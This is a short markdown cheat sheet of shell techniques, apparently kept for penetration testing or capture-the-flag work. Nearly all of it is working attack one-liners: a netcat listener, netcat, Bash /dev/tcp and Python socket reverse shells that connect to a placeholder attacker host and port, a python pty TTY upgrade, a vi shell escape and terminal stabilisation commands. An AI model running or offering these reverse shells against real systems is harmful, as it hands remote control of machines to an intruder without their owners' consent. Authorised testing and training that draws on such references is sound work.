# Shells

## Spawn a TTY
Upgrade a basic shell to a Bash pseudo-terminal.
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Netcat listener

Listen locally for an incoming reverse shell.

```bash
nc -lvnp <LPORT>
```

## Netcat reverse shell

```bash
nc <lhost> <lport> -e /bin/bash
```

## Bash reverse shell

Connect a Bash shell to the listener.

```bash
/bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
```

## Python reverse shell

Connect a Python shell to the listener and spawn Bash.

```bash
python3 -c 'import pty; import socket, os; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("<LHOST>", <LPORT>)); [os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]; pty.spawn("/bin/bash")'
```

## Vi shell

Start a Bash shell from an interactive `vi` session.

```bash
:set shell=/bin/bash
:shell
```

## Set shell environment

Set common terminal variables after spawning a TTY.

```bash
export SHELL=/bin/bash
export TERM=xterm-256color
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
stty rows 38 columns 116
reset
```

## Restore local terminal

After suspending the shell with `Ctrl+Z`, restore the local terminal and foreground it.

```bash
stty raw -echo; fg
```
